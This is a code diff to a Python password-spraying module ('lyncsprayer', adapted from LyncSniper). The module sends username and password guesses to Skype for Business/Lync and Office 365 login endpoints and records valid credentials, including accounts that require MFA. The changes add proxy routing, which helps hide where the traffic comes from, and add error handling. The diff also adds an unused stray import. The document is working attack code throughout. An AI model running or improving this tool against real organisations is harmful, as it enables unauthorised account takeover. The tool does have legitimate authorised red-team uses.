@@ -1,3 +1,4 @@
+from lib2to3.pytree import Base
 import logging
 import requests
 import urllib.parse as urlparse
@@ -10,7 +11,7 @@ from datetime import datetime
 
 
 class Lync:
-    def __init__(self, target):
+    def __init__(self, target, proxy=None):
         self.domain = target
         self.log = logging.getLogger('lyncsprayer')
         self.valid_accounts = set()
@@ -18,6 +19,7 @@ class Lync:
         self.lync_base_url = None
         self.lync_auth_url = None
         self.O365 = False
+        self.proxy = proxy
 
         self.recon()
 
@@ -51,7 +53,7 @@ class Lync:
 
         for url in urls:
             try:
-                requests.get(url, verify=False)
+                requests.get(url, verify=False, proxies=self.proxy)
                 return url
             except ConnectionError:
                 continue
@@ -59,18 +61,18 @@ class Lync:
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L259
     def get_s4b_base_url(self, url):
         headers = {"Content-Type": "application/json"}
-        r = requests.get(url, headers=headers, verify=False).json()
+        r = requests.get(url, headers=headers, verify=False, proxies=self.proxy).json()
         if 'user' in r['_links']:
             return r['_links']['user']['href']
 
         return self.get_s4b_base_url(r['_links']['redirect']['href'])
 
     def get_internal_s4b_hostname(self, url):
-        r = requests.get(url, verify=False)
+        r = requests.get(url, verify=False, proxies=self.proxy)
         return r.headers['X-MS-Server-Fqdn']
 
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L409
-    def auth_O365(self, username, password):
+    def auth_O365(self, username, password, proxy):
         log = logging.getLogger(f"auth_lync_O365({username})")
 
         utc_time = datetime.utcnow().replace(tzinfo=simple_utc()).isoformat()
@@ -110,27 +112,31 @@ class Lync:
 </S:Envelope>"""
 
         headers = {'Content-Type': "application/soap+xml; charset=utf-8"}
-        r = requests.post("https://login.microsoftonline.com/rst2.srf", headers=headers, data=soap)
-        xml = etree.XML(r.text.encode())
-        msg = xml.xpath('//text()')[-1]
-
-        if 'Invalid STS request' in msg:
-            log.error(print_bad('Invalid request was received by server, dumping request & response XML'))
-            log.error(soap + '\n' + r.text)
-        elif ('the account must be added' in msg) or ("The user account does not exist" in msg):
-            log.info(print_bad(f"Authentication failed: {username}:{password} (Username does not exist)"))
-        elif 'you must use multi-factor' in msg.lower():
-            log.info(print_good(f"Found Credentials: {username}:{password} (However, MFA is required)"))
-            self.valid_accounts.add(f'{username}:{password}')
-        elif 'No tenant-identifying information found' in msg:
-            log.info(print_bad(f"Authentication failed: {username}:{password} (No tenant-identifying information found)"))
-        elif 'FailedAuthentication' in r.text: # Fallback
-            log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
+        try:
+            r = requests.post("https://login.microsoftonline.com/rst2.srf", headers=headers, data=soap, proxies=proxy)
+        except BaseException as e:
+            log.error(print_bad(f"Error during authentication: {e}"))
         else:
-            log.info(print_good(f"Found credentials: {username}:{password}"))
-            self.valid_accounts.add(f'{username}:{password}')
+            xml = etree.XML(r.text.encode())
+            msg = xml.xpath('//text()')[-1]
 
-        log.debug(r.text)
+            if 'Invalid STS request' in msg:
+                log.error(print_bad('Invalid request was received by server, dumping request & response XML'))
+                log.error(soap + '\n' + r.text)
+            elif ('the account must be added' in msg) or ("The user account does not exist" in msg):
+                log.info(print_bad(f"Authentication failed: {username}:{password} (Username does not exist)"))
+            elif 'you must use multi-factor' in msg.lower():
+                log.info(print_good(f"Found Credentials: {username}:{password} (However, MFA is required)"))
+                self.valid_accounts.add(f'{username}:{password}')
+            elif 'No tenant-identifying information found' in msg:
+                log.info(print_bad(f"Authentication failed: {username}:{password} (No tenant-identifying information found)"))
+            elif 'FailedAuthentication' in r.text: # Fallback
+                log.info(print_bad(f"Authentication failed: {username}:{password} (Invalid credentials)"))
+            else:
+                log.info(print_good(f"Found credentials: {username}:{password}"))
+                self.valid_accounts.add(f'{username}:{password}')
+
+            log.debug(r.text)
 
     # https://github.com/mdsecresearch/LyncSniper/blob/master/LyncSniper.ps1#L397-L406
     def auth(self, username, password):
@@ -142,13 +148,17 @@ class Lync:
             "password": password
         }
 
-        r = requests.post(self.lync_auth_url, data=payload, verify=False)
         try:
-            r.json()['access_token']
-            log.info(print_good(f"Found credentials: {username}:{password}"))
-            self.valid_accounts.add(f'{username}:{password}')
-        except Exception as e:
-            log.info(print_bad(f"Invalid credentials: {username}:{password}"))
+            r = requests.post(self.lync_auth_url, data=payload, verify=False)
+        except BaseException as e:
+            log.error(print_bad(f"Error during authentication: {e}"))
+        else:
+            try:
+                r.json()['access_token']
+                log.info(print_good(f"Found credentials: {username}:{password}"))
+                self.valid_accounts.add(f'{username}:{password}')
+            except Exception as e:
+                log.info(print_bad(f"Invalid credentials: {username}:{password}"))
 
     def __str__(self):
         return "lync"
